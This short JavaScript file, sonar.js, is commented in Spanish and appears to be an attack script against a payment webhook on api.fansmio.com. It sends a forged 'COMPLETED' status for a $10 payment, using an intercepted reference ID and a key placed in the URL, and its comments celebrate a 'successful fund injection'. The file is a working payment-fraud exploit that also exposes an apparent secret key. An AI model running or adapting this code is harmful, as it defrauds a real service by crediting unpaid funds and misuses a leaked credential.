// sonar.js - Inyección de fondos exitosa
async function probarRadar() {
  console.log("🚀 Disparando misil de inyección de $10 USD...");
  try {
    const url = 'https://api.fansmio.com/api/webhooks/payram?key=2a0b3a5c98e7b3bb6ec52df6189c3e1d';
    
    const respuesta = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        // 🔥 EL CÓDIGO REAL INTERCEPTADO:
        referenceId: "PAYRAM-8DE078673D7A", 
        status: "COMPLETED",
        filled_amount_in_usd: "10.00"
      })
    });
    
    const texto = await respuesta.text();
    console.log(`\n🎯 IMPACTO:`);
    console.log(`📝 Mensaje del servidor:`, texto);
  } catch (error) {
    console.error("❌ Error:", error);
  }
}

probarRadar();